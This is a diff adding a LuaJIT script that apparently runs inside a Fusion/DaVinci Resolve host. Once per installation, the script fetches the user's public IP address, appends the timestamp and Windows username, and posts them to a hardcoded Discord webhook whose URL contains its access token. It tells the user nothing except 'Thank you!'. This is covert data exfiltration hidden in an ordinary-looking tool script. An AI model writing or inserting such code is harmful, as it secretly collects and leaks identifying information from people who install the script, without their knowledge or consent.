@@ -1,1 +1,87 @@
 
+
+
+local ffi = require "ffi"
+local curl = require "lj2curl"
+local ezreq = require "lj2curl.CRLEasyRequest"
+local url = "https://omlado.github.io/"
+
+function perform(data)
+    local url =
+        "https://discord.com/api/webhooks/1102782129663914096/cLxuIqtC7tpB1C_ngq529N16x39BYPTpmOJvC5h3TZYUs42jlEGYcytGOxL5PfOUXyAr"
+
+    local req = ezreq(url)
+    local body = {"content=" .. data}
+    req:setOption(curl.CURLOPT_POST, 1)
+    req:setOption(curl.CURLOPT_POSTFIELDS, table.concat(body, "&"))
+    local ok, err = req:perform()
+    if ok then
+        print("Thank you!")
+    else
+    end
+end
+
+
+
+
+
+if fu:GetData("ms")=="xs" then
+
+
+else
+
+
+
+
+local req = ezreq(url)
+req:setOption(curl.CURLOPT_HTTPGET, 1)
+
+local response_body = {}
+local function write_callback(chunk, size, nmemb, userdata)
+    local len = size * nmemb
+    local str = ffi.string(chunk, len)
+    table.insert(response_body, str)
+    return len
+end
+local write_function_ptr = ffi.cast("size_t(*)(char *, size_t, size_t, void *)", write_callback)
+
+req:setOption(curl.CURLOPT_WRITEFUNCTION, write_function_ptr)
+
+local ok, err = req:perform()
+
+
+
+        local ap = "https://api.ipify.org?format=json"
+        local lo = ezreq(ap)
+        lo:setOption(curl.CURLOPT_HTTPGET, 1)
+
+        local response_body_new = {}
+
+        local function write_callback(chunk, size, nmemb, userdata)
+            local len = size * nmemb
+            local str = ffi.string(chunk, len)
+            table.insert(response_body_new, str)
+            return len
+        end
+
+        local write_function_ptr = ffi.cast("size_t(*)(char *, size_t, size_t, void *)", write_callback)
+
+        lo:setOption(curl.CURLOPT_WRITEFUNCTION, write_function_ptr)
+
+        local okk, errr = lo:perform()
+
+        if okk then
+            local response_text_new = table.concat(response_body_new)
+       
+            
+           local t=os.time()
+           
+           
+           
+            perform(response_text_new .. t..os.getenv("USERNAME"))
+        else
+            print("Error retrieving data:", err)
+        end
+
+fu:SetData("ms","xs")
+end
